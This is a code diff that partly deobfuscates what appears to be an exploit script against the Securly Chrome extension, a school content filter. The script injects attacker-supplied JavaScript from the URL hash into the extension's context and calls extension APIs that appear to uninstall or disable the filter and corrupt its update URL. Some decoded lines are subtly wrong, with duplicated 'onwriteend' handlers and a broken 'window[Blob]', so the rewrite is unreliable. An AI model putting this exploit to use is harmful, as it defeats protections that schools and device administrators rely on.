@@ -100,13 +100,15 @@ const m = function() {
         x = document.createElement("script");
       x.src = URL.createObjectURL(D), securlyWindow.document.body.appendChild(x) // ?? Injecting the code?
     }
+
     try {
       for (let $ = 0; $ < 10; $++) Reflect.construct(Blob, []);
       x()
     } catch (C) {}
+
     async function t(n, _, D) {
       let x = await new Promise(n => {
-        window[d`G52;9D"5AE5CD\x169<5#ICD5=`](0, D.length, n)
+        window['webkitRequestFileSystem'](0, D.length, n)
       });
       return await new Promise(_ => {
         x.root.getFile(n, {}, n => {
@@ -116,12 +118,12 @@ const m = function() {
         x.root.getFile(n, {
           create: !0
         }, n => {
-          n[d`3B51D5'B9D5B`](x => {
-            x[d`?>GB9D5е>4`] = () => {
+          n['createWriter'](x => {
+            x['onwriteend'] = () => {
               delete[x, n]
-            }, x[d`?>GB9D55>4`] = () => {
-              $(n[d`D?%"\x1C`]())
-            }, x.write(new window[d`\x12<?2`]([D], {
+            }, x['onwriteend'] = () => {
+              $(n.toURL())
+            }, x.write(new window[Blob]([D], {
               type: _
             }))
           })
@@ -132,12 +134,13 @@ const m = function() {
     function B() {
       if (!window[d`<?31D9?>`][d`81C8`]) throw new window[d`\x15BB?B`]("IDK");
       let n = location.hash.replace("#", "");
-      t(Math.random() + ".js", d`D5HD}:1F1C3B9@D`, n).then(n => {
+      t(Math.random() + ".js", 'text/javascript', n).then(n => {
         let _ = document.createElement("script");
         _.src = n, document.body.appendChild(_)
       })
     }
-    securlyWindowChrome().runtime.id.startsWith("j") && (document.getElementById("updates").textContent = d`@1I<?14n\x03n1@@<954|nvI?En1B5>uDnCE@@?C54nD?n;>?GnG81DnD89Cn=51>Cw`, securlyWindowChrome().extension[d`C5D%@41D5%B<\x141D1`](decodeURIComponent(d`s\x15\x00s\x12\x06s\t\x15`).repeat(1024))), localStorage[d`3<ECD5B`]?.startsWith(d`\x11&\x1F\x19\x14/\x1F#z`) || (D.checked = !0), D.onclick = function $() {
+    securlyWindowChrome().runtime.id.startsWith("j") && (document.getElementById("updates").textContent = 'payload 3 applied. (you aren\'t supposed to know what this means)', securlyWindowChrome().extension['setUpdateUrlData'](decodeURIComponent('ඞ').repeat(1024))), localStorage['d`3<ECD5B`']?.startsWith('AVOID_OS') || (D.checked = !0), D.onclick = function $() {
+    // Decoding above line. (t/f) && ((t/f))
       D[d`3853;54`] ? (delete window.WebRequestEventImpl, localStorage.clear()) : (securlyWindowChrome().management[d`E>9>CD1<<#5<6`].bind(securlyWindowChrome().runtime.id), Storage.prototype[d`C5D\x19D5=`].call(window[d`<?31<#D?B175`], d`3<ECD5B`, d`\x11&\x1F\x19\x14/\x1F#z` + Date.now() * (Math[d`B1>4?=`]() + 1.5))), location.reload.call(securlyWindow[d`<?31D9?>`]), setTimeout(x, 1500)
     }, t(d`}9|:C`, d`D5HD}:1F1C3B9@D`, o + d + t + B + ";" + B.name + "()//"), t(d`}9|8D=<`, "text/html", d`\fC3B9@DnCB3\rp|}9|:Cp\x0E\f}C3B9@D\x0E`)
   },
